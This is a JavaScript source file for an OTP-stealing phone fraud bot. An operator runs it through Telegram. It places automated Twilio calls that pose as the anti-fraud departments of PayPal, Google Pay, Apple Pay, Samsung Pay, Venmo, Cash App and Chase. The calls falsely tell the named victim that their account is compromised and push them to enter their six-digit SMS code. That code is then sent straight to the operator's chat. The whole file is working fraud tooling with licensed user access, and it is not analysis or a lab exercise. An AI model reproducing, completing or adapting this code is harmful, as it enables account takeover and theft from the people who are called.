import telegramBot from 'node-telegram-bot-api'
import twilio, { twiml } from 'twilio'
import LinebridgeServer from 'linebridge/server'
import { EventEmitter } from "events"
import { randomUUID } from 'crypto'
import { request } from 'express'
import { json } from 'body-parser'
// where is the .env ?
const fs = require('fs')
const axios = require('axios').default
const express = require('express');

let playerData = []

const messages = {
    'paypal':" This is an automatic alert from PayPal ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'googlepay':" This is an automatic alert from Google ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'applepay': " This is an automatic alert from Apple ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'samsungpay': " This is an automatic alert from Samsung ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'venmo': " This is an automatic alert from Venmo ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'chasebank': " This is an automatic alert from Chase ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    'cashapp': " This is an automatic alert from Cashapp ANTI-FRAUD SERVICE DEPARTMENT. Your account has been compromised AND we have detected a suspicious transaction on your account. If you are the author of this transaction press 1. If you are not the author of this transaction press 2. IF you want to repeat the message press 3.",
    
}

class TwilioController {
    constructor(tokens = {}, eventBus) {
        this.eventBus = eventBus

        this.tokens = {
            sid: tokens.sid ?? _env.twilio_account_sid,
            auth: tokens.auth ?? _env.twilio_auth_token
        }

        this.client = twilio(this.tokens.sid, this.tokens.auth)
        this.phoneNumber = _env.twilio_phone_number // TODO: Automatically get this from twilio
        this.CallSid = "test"
       
        Object.keys(this.handlers).forEach(key => {
            this.eventBus.on(key, (...args) => {
                if (typeof this.handlers[key] === 'function') {
                    this.handlers[key](...args)
                }
            })
        })
    }

    handlers = {
        makeGetterCodeCall: (to) => {
            this.call({
                to: to,
                twiml: `<Response><Gather input="dtmf" timeout="30" numDigits="6"><Say>Please input the 6 digits OTP code</Say></Gather></Response>`,
            })
        },
        makeTextCall: (to, message) => {
            this.call({
                to: to,
                twiml: `<Response><Say>${message}</Say></Response>`,
            })
        },
        /*makeUrlCall: (to, from, url, id) => {
            this.call({
                url: `${_env.NGROK_URL}/${url}/${id}`,
                to: to,
                // from: from,
            },id)
        },*/
        makeUrlCall: (to, from, service, lang, id,name) => {
            let nam = `${name}`
            let res  = nam.replace(' ','-')

            this.call({
                url: `${_env.NGROK_URL}/call/${service}/${lang}/${id}/`+res,
                to: to,
                statusCallback: `${_env.NGROK_URL}/event/${id}`,
                statusCallbackEvent: ['initiated','ringing','answered','completed'],
                statusCallbackMethod: 'POST',


                //from: from,
            },id)
        },

        makeCustomCall: (to, text) => {
            try {
                console.log(text)
                // TODO: Change to the spoofed number
                this.call({
                    to: to,
                    twiml: `<Response>${text}</Response>`,
                })
            } catch (error) {
                console.log(error)
            }
        }
    }

    call = (payload, id) => {

        this.eventBus.emit(`${id}_call_sended`)
        this.client.calls.create({
            ...payload,
            from: this.phoneNumber,
             
            
        })
            .then(call => {

                this.eventBus.emit(`${id}_call_accepted`)   
             
            })
            .catch(err => {
                console.log(err)
                this.eventBus.emit(`${id}_call_rejected`) 
                      
            })
    }
}

class TelegramController {
    constructor(token, eventBus) {
        this.eventBus = eventBus
        this.token = token ?? _env.telegramBot_token

        this.bot = new telegramBot(this.token, { polling: true })

        this.bot.on("polling_error", console.log);

        this.setCommands()
    }

    methods = {
        applepay: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'venmo', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as ApplePay`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
        sasmungpay: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'venmo', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as SamsungPay`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
        venmo: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'venmo', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as Venmo.`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
        chasebank: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'chase', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as ChaseBank.`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
        paypal: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'paypal', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as Paypal.`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
        googlepay: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'google', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as GooglePay.`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, `state: ${status}`)
            })
            
        },
        cashapp: (msg, match) => {
            const chatId = msg.chat.id
            let player = playerData[msg.from.id].data
            
            this.eventBus.emit('makeUrlCall', player.victimNumber, player.fromNumber, 'venmo', player.language, msg.from.id,player.victimName)
            
            this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as CashApp`)
            this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.sendMessage(chatId, `call accepted`)
            })

            this.eventBus.once(`${msg.from.id}_call_rejected`, () => {
                this.bot.sendMessage(chatId, `call rejected`)
            })

            this.eventBus.once(`${msg.from.id}_code`, (code) => {
                this.bot.sendMessage(chatId, `📬 Code: ${code}`)
            })
            
            this.eventBus.on(`${msg.from.id}_status`, (status) => {
                this.bot.sendMessage(chatId, ` 🚦 state: ${status}`)
            })
        },
      
       /* custom: async(msg, match) => {
            let player = playerData[msg.from.id].data
            const chatId = msg.chat.id
            this.bot.sendMessage(chatId, "Please enter the mensaje you want to send")
            playerData[msg.from.id].waitingTo = "call_message"
            
            await this.eventBus.once(`call_message_${msg.from.id}`, (msg, match) => {
                this.eventBus.emit('makeCustomCall', playerData[msg.from.id].data.victimNumber, msg.text)
                this.bot.sendMessage(chatId, `📞 Calling to [${player.victimNumber}](${player.victimName})  [${player.fromNumber}] as ${player.service}.`)
            });
        }*/
    }

    functions = {

        methodHandler: async (msg) => {
            let player = playerData[msg.from.id].data
            const chatId = playerData[msg.from.id].chatId

            let mmsg

            await this.eventBus.once(`${msg.from.id}_call_sended`, () => {
                mmsg = this.bot.sendMessage(chatId, `📞 [Pending] Call to [${player.victimNumber}] as ${player.service}.`)
                console.log(mmsg)
            });

            await this.eventBus.once(`${msg.from.id}_call_reject`, () => {
                this.bot.editMessageText(`📞 [Rejected] Call to [${player.victimNumber}] as ${player.service}.`, {
                    message_id: mmsg.message_id,
                    chat_id: mmsg.chat.id,
                })
            });

            await this.eventBus.once(`${msg.from.id}_call_accepted`, () => {
                this.bot.editMessageText(`📞 [Recibed] Call to [${player.victimNumber}] as ${player.service}.`, {
                    message_id: mmsg.message_id,
                    chat_id: mmsg.chat.id,
                })
            });

            this.eventBus.once(`${msg.from.id}_code`, (code) => {

                this.bot.editMessageText(`📞 [Finished] Call to [${player.victimNumber}] as ${player.service}.\n Code: ${code}`, {
                    message_id: mmsg.message_id,
                    chat_id: mmsg.chat.id,
                })

                // this.bot.sendMessage(chatId, `Code: ${code}`)
            })
        },
        contact_suport: (msg) => {
            const chatId = msg.chat.id
            this.bot.sendMessage(chatId, "Contact with @Eslout")
        },
     
        call: async(msg) => {
            let uuid = randomUUID()
            uuid = uuid.slice(uuid.length/2)
            let time = Date.now()

            let chatId = msg.chat.id

            if(!playerData[msg.from.id]) {
                playerData[msg.from.id] = {
                    waitingTo: null,
                    data: [],
                    chatId: chatId
                }
            }

            const options = {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                    [{ text: '🇪🇸Spanish Module', callback_data: `${uuid}_${time}_es-ES` }],
                    [{ text: '🇺🇸English Module', callback_data: `${uuid}_${time}_en-US` }],
                    [{ text: '🇫🇷French Module', callback_data: `${uuid}_${time}_fr-FR` }],
                    [{ text: '🇮🇹Italy Module', callback_data: `${uuid}_${time}_it-IT` }],
                    ]
                })
            };

            this.bot.sendMessage(chatId, "🌎Select a language module", options)

            chatId = null

            options.reply_markup = JSON.parse(options.reply_markup);

            options.reply_markup.inline_keyboard.forEach(element => {
                let callback_data = element[0].callback_data

                this.eventBus.once(`${callback_data}_${msg.from.id}`, async (_) => {
                    const language = callback_data.slice(uuid.length + time.toString().length + 2)
                    callback_data = undefined
                    const chatId = msg.chat.id

                    const example = {
                        'es-ES': '+34655552523',
                        'en-US': '+13405559799',
                        'fr-FR': '+33745556991',
                        'it-IT': '+393505555385'
                    }
            
                    this.bot.sendMessage(chatId, `😗Please enter the victim's phone number.(Example:   ${example[language]})`)
                    playerData[msg.from.id].waitingTo = "call_victim_number"
                    await this.eventBus.once(`call_victim_number_${msg.from.id}`, async (msg, match) => {
                        const victimNumber = match
                        //this.bot.sendMessage(chatId, "😗Please enter the from number")
                        //playerData[msg.from.id].waitingTo = "call_from_number"
                        //await this.eventBus.on(`call_from_number_${msg.from.id}`, async (msg, match) => {
                        //    const fromNumber = match
                        //    console.log(fromNumber)
                        this.bot.sendMessage(chatId, "😗Please enter the victim's name")
                        playerData[msg.from.id].waitingTo = "call_victim_name"
                        await this.eventBus.once(`call_victim_name_${msg.from.id}`, async (msg, match) => {
                            const victimName = match
                            const options = {
                                reply_markup: JSON.stringify({
                                inline_keyboard: [
                                    [{ text: 'Paypal (US)', callback_data: 'paypal' }],
                                    [{ text: 'GooglePay (US)', callback_data: 'googlepay' }],
                                    [{ text: 'ApplePay (US)', callback_data: 'applepay' }],
                                    [{ text: 'SamsungPay (US)', callback_data: 'samsungpay' }],
                                    [{ text: 'Venmo (US)', callback_data: 'venmo' }],
                                    [{ text: 'CashApp (US)', callback_data: 'cashapp' }],
                                    [{ text: 'ChaseBank (US)', callback_data: 'chasebank' }]
                                    // [{ text: 'Custom', callback_data: 'custom' }]
                                ]
                                })
                            };
                            this.bot.sendMessage(chatId, "😊Please select the module", options)
                            
                            options.reply_markup = JSON.parse(options.reply_markup);
            
                            options.reply_markup.inline_keyboard.forEach(element => {
                                let callback_data = element[0].callback_data
                                this.eventBus.once(`${callback_data}_${msg.from.id}`, (_) => {
                                    playerData[msg.from.id].waitingTo = null
                                    playerData[msg.from.id].data = {
                                        victimNumber: victimNumber,
                                        fromNumber: null,
                                        victimName: victimName,
                                        service: callback_data,
                                        language: language
                                    }
                                    this.methods[callback_data](msg, match)
                                });
                            });
                        });
                        //});
                    });  
                });
            });
        }
    }
    handlers = {
         clear: async(msg) => {
           
            this.bot.sendMessage(msg.chat.id,'I died 😵')
            .then(() => {

            playerData[msg.from.id].data = null

           });
               },

        start: async(msg) => {
            let uuid = randomUUID()
            uuid = uuid.slice(uuid.length/2)
            let time = Date.now()

            let chatId = msg.chat.id
            
            let isAllowed = await this.isAllowed({ chat_id: msg.chat.id, user_id: msg.from.id })

            if (!isAllowed) {
                console.log("Unauthorized " + msg.from.id)
                isAllowed = null
                return this.bot.sendMessage(chatId, "❌ You are not allowed to use this command")
            }
            isAllowed = null

            if(!playerData[msg.from.id]) {
                playerData[msg.from.id] = {
                    waitingTo: null,
                    data: [

                    ]
                }
            }

            const options = {
                reply_markup: JSON.stringify({
                    inline_keyboard: [
                    [{ text: '☎️CALL (NO SPOOF)', callback_data: `${uuid}_${time}_call` }],
                    [{ text: '🎫SUPPORT', callback_data: `${uuid}_${time}_contact_suport` }]
                    ]
                })
            };

            this.bot.sendMessage(chatId, "🤔PLEASE SELECT AN OPTION", options)

            chatId = null

            options.reply_markup = JSON.parse(options.reply_markup);

            options.reply_markup.inline_keyboard.forEach(element => {
                let callback_data = element[0].callback_data

                this.eventBus.once(`${callback_data}_${msg.from.id}`, (_) => {
                    
                    this.functions[callback_data.slice(uuid.length + time.toString().length + 2)](msg)
                });
            });
        }
    }

    isAllowed = (payload) => {
        return new Promise(async (resolve, reject) => {
            const { chat_id, user_id } = payload
            // TODO: Change the json to mongodb
            /*
            try {
                License.findOne({ user_id: user_id }).select('endtime')
                .then(data => {
                    if(data) {
                        console.log(data)
                        console.log(Date.now())
                        if(data.endtime > Date.now()) {
                            resolve(true)
                        } else {
                            resolve(false)
                        }
                    } else {
                        resolve(false)
                    }
                });                
            } catch (error) {
                resolve(false)                
            }*/

            fs.readFile(`./users.json`, (err, data) => {
                if (err) {
                    console.log(err)
                } else {
                    const users = JSON.parse(data).users
                    const user = users.find(user => user.user_id == user_id)
                    
                    if (user != undefined) {
                        resolve(true)
                    } else {
                        resolve(false)
                    }
                }
            })
        })
    }

    setCommands = () => {
        const eventKeys = Object.keys(this.handlers)
      

        this.bot.on('message',async msg => {
            const waiting = playerData[msg.from.id]?.waitingTo
            if(!waiting){
                eventKeys.forEach(async event => {
                    try {
                        const regex = new RegExp(`\/${event}`)
        
                        const match = msg.text.match(regex)
            
                        if (match) {
                            if (typeof this.handlers[event] === "function") {
                                await this.handlers[event](msg, match)
                            }
                        }                        
                    } catch (error) {
                        
                    }
                })
            }else{
                this.eventBus.emit(`${playerData[msg.from.id].waitingTo}_${msg.from.id}`, msg, msg.text)
            }
        });

        this.bot.on('callback_query', (callbackQuery) => {
            const {data} = callbackQuery
            const chatId = callbackQuery.message.chat.id
            const msg = callbackQuery.message

            if(data != null){
                this.eventBus.emit(`${data}_${msg.chat.id}`)
            }
        });
    }
}

class Server {
    constructor() {
        this.env = _env
        this.listenPort = this.env.listenPort ?? 3193


        this.instance = new LinebridgeServer({
            listen: "0.0.0.0",
            port: this.listenPort
        })

        this.server = this.instance.httpServer

       

        this.eventBus = new EventEmitter()

        this.TwilioController = new TwilioController(undefined, this.eventBus)
        this.TelegramController = new TelegramController(undefined, this.eventBus)

        this.initialize()
    }

    getInstanceInfo = () => {
        return {
            id: this.instance.id,
            usid: this.instance.usid,
            oskid: this.instance.oskid,
            time: new Date().getTime(),
            version: SERVER_VERSION,
        }
    }

    async initialize() {
        this.InitURL()
       

        // register middlewares
    

        await this.instance.init()
    }


    InitURL(){
        const app = express();
        const urlencoded = require('body-parser').urlencoded;
        const VoiceResponse = twilio.twiml.VoiceResponse;
        
        app.use(urlencoded({ extended: false }));
    
        app.post('/call/:service/:lang/:id/:name', async (request, response) => {
            // Use the Twilio Node.js SDK to build an XML response
    
            const twiml = new VoiceResponse();

            // Use the <Gather> verb to collect user input
            const gather = twiml.gather({
                action: `/gather/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`,
                method: 'POST',
                input: 'dtmf',
                numDigits: 1,
                timeout: 30
            });
            let name = request.params.name
            let res  = name.replace('-',' ')

            let message = "Hello, " + res + messages[request.params.service]

            gather.say({
                voice: 'woman',
                language: request.params.lang
            }, message);

            twiml.redirect(`/call/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`);

/*            

            gather.say({
                voice: 'woman',
                language: lang
            }, "Automated Alert From PayPal. Your account has been compromised. We have sent you a one time code to verify your identity. Please provide the code to this number with the dialpad.")
*/
            response.type('text/xml');
            response.send(twiml.toString());         
        });

        app.post('/gather/:service/:lang/:id/:name', (request, response) => {
        
            const twiml = new VoiceResponse();


            // If the user entered digits, process their request
            if (request.body.Digits) {
                switch (request.body.Digits) {
                case '1':
                    const gath = twiml.gather({
                        action: `/zin/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`,
                        method: 'POST',
                        input: 'dtmf',
                        numDigits: 6,
                        timeout: 30
                    });
                    let message = "Our automated system will help you complete the transaction, enter the 6-digit one-time sms code to complete the transaction and secure your account."

                    gath.say({
                        voice: 'woman',
                        language: request.params.lang
                    }, message);


                    break;
                case '2':
                    const gatho = twiml.gather({
                        action: `/zin/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`,
                        method: 'POST',
                        input: 'dtmf',
                        numDigits: 6,
                        timeout: 30
                    });
                    let mesge = "Our automated system will help you to block the transaction, enter the 6-digit one-time sms code to cancel the transaction and secure your account."

                    gatho.say({
                        voice: 'woman',
                        language: request.params.lang
                    }, mesge);


                    break;
                    case '3':
                        twiml.pause();
                        twiml.redirect(`/call/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`);
                        break;


                    default:
                    twiml.say({voice: 'woman',
                            language: 'en-US'
                        }, 'Sorry, I dont understand this choice.');
                
                    twiml.pause();
                    twiml.redirect(`/call/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`);
                    break;
                }
            } else {
                // If no input was sent, redirect to the /voice route
                twiml.redirect(`/call/${request.params.service}/${request.params.lang}/${request.params.id}`);
            }
        
            /*if (request.body.Digits) {
                console.log("🤑Acquired Code: " + request.body.Digits)
        
                this.eventBus.emit(`${request.params.id}_code`, request.body.Digits)
                
                twiml.say("YOUR ACCOUNT WAS SECURED")
                
                twiml.hangup()
                
            } else {
                console.log("No Digits")
                return;
            }*/
        
            response.type('text/xml');
            response.send(twiml.toString());
        });
        app.post('/event/:id/', (request, response) => {
            
            console.log("🎞 status :" +request.body.CallStatus)
        
            this.eventBus.emit(`${request.params.id}_status`, request.body.CallStatus)
            
        
            response.type('text/xml');
            response.send(twiml.toString());
        });
      
        app.post('/zin/:service/:lang/:id/:name', (request, response) => {
        
            const twiml = new VoiceResponse();

            if (request.body.Digits) {
                console.log("🤑Acquired Code: " + request.body.Digits)
        
                this.eventBus.emit(`${request.params.id}_code`, request.body.Digits)
                
                twiml.say({voice: 'woman',
                language: request.params.lang
            }, "Thank you, the operation has been completed successfully and your account is now safe.");
                
                twiml.hangup()
                
            } else {
                twiml.redirect(`/call/${request.params.service}/${request.params.lang}/${request.params.id}/${request.params.name}`);
                console.log("No Digits")
                return;
            }
        
            response.type('text/xml');
            response.send(twiml.toString());
        });
        
        console.log('Twilio Client app HTTP server running at http://127.0.0.1:392a');
        app.listen(3921);
    }


}


new Server()